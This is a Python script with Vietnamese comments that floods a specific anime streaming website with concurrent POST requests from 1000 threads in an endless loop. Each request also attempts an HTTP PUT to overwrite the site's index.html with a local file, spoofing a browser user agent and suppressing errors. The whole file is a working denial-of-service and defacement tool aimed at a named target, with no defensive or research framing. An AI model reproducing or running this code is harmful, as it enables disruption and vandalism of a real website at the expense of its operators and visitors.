import requests
import threading
import time
from concurrent.futures import ThreadPoolExecutor

URL = "https://animevietsub.ru/"  # THAY ĐỔI URL
REQUESTS = 100000000000000000000
CONCURRENCY = 1000
HTML_FILE_PATH = "index.html"  # Đường dẫn đến file HTML của bạn

def make_request_with_html():
    """Hàm thực hiện request và gửi file HTML"""
    try:
        # Đọc nội dung file HTML của bạn
        with open(HTML_FILE_PATH, 'r', encoding='utf-8') as file:
            html_content = file.read()
        
        # Headers để giả lập request hợp lệ
        headers = {
            'Content-Type': 'text/html',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        
        # Gửi POST request với file HTML
        response = requests.post(
            URL,
            data=html_content,
            headers=headers,
            timeout=3
        )
        
        # Thử gửi PUT request để thay thế index.html (nếu server cho phép)
        put_url = f"{URL}/index.html"
        requests.put(
            put_url,
            data=html_content,
            headers=headers,
            timeout=3
        )
        
    except requests.RequestException as e:
        pass  # Bỏ qua các lỗi nếu có

def send_requests():
    """Hàm thực hiện tất cả requests"""
    with ThreadPoolExecutor(max_workers=CONCURRENCY) as executor:
        # Tạo list các task
        futures = [executor.submit(make_request_with_html) for _ in range(REQUESTS)]
        # Chờ tất cả các task hoàn thành
        completed = 0
        for future in futures:
            future.result()
            completed += 1
            if completed % 100 == 0:  # Cập nhật tiến trình mỗi 100 requests
                print(f"Đã hoàn thành {completed}/{REQUESTS} requests")
    print(f"Đã hoàn thành tất cả {REQUESTS} requests")

# Vòng lặp vô hạn
while True:
    print(f"Bắt đầu gửi {REQUESTS} requests với file HTML...")
    send_requests()
    time.sleep(1)  # Đợi 1 giây trước khi thực hiện lại
